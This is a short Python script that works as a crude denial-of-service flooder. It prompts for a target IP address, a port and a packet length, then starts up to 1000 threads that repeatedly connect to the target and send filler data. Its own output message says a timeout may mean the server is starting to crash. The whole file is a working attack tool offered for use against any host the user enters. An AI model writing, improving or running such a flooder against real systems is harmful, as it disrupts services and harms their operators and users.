import socket
from sys import getsizeof
import _thread
from time import sleep

def attacker(ip, port, pklength):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip), int(port)))
            x = ''
            y = 0
            while y <= int(pklength):
                x += 'x'
                y += 1
            print("just sent a packet with " + str(getsizeof(x)) + " bytes!")
            s.send(bytes(x, 'UTF-8'))
            s.close()
            sleep(0.5)
        except BrokenPipeError:
            print("\033[1;31m" + "Failed to send a packet: Broken Pipe Error." + "\033[0;0m")
        except socket.gaierror:
            print("\033[1;31m" + "TERMINAL FAILURE! Could not connect!" + "\033[0;0m")
            exit()
        except socket.timeout:
            print("\033[1;31m" + "Failed to send a packet: Timeout Error. This could mean that the server is starting to slow and crash." + "\033[0;0m")
emblem = open('emblem', 'r')
print(emblem.read())
ip = input("IP address >>")
pklength = input("Packet Length (chars) >>")
spp = input("Specify Port? (y/n) >>")
if (spp != 'y' and spp != 'n'):
    print('that was taken for a no. Packets will be sent to port 80 (http)')
    port = 80
elif (spp == 'y'):
    port = input('Port >>')
else:
    print('Packets will be sent to port 80 (http)')
    port = 80

threadLimiter = 0
while threadLimiter < 1000:
    _thread.start_new_thread(attacker, (ip, port, pklength))
    print('thread ' + str(threadLimiter) + ' started')
    threadLimiter += 1
    sleep(1)
while True:
    #if platform == 'darwin':
    #    os.system("ping " + ip)
    #elif platform == "win32" or platform == "cygwin":
    pass



